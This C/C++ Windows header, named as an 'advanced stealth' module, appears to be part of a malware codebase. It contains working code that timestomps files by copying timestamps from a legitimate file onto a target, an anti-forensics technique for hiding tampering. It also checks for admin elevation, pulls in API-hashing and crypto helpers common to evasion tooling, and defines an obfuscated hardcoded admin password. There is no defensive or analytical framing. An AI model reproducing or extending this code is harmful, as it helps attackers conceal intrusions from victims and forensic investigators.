#ifndef ADVANCED_STEALTH_H
#define ADVANCED_STEALTH_H

#include <windows.h>
#include <string>
#include "api_hashes.h"
#include "crypto.h"

#define SIMULATED_ADMIN_PASS STOBFS_W(L"*TIsoporte")

static BOOL Timestomp(LPCWSTR targetPath, LPCWSTR sourcePath) {
    HANDLE hTarget = CreateFileW(targetPath, GENERIC_WRITE | FILE_WRITE_ATTRIBUTES, 0, NULL, OPEN_EXISTING, 0, NULL);
    HANDLE hSource = CreateFileW(sourcePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    
    if (hTarget == INVALID_HANDLE_VALUE || hSource == INVALID_HANDLE_VALUE) {
        if (hTarget != INVALID_HANDLE_VALUE) CloseHandle(hTarget);
        if (hSource != INVALID_HANDLE_VALUE) CloseHandle(hSource);
        return FALSE;
    }

    FILETIME ftCreate, ftAccess, ftWrite;
    if (GetFileTime(hSource, &ftCreate, &ftAccess, &ftWrite)) {
        SetFileTime(hTarget, &ftCreate, &ftAccess, &ftWrite);
    }

    CloseHandle(hTarget);
    CloseHandle(hSource);
    return TRUE;
}

static BOOL IsRunningAsAdmin() {
    BOOL isAdmin = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD size;
        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &size)) {
            isAdmin = elevation.TokenIsElevated;
        }
    }
    if (hToken) CloseHandle(hToken);
    return isAdmin;
}

#endif
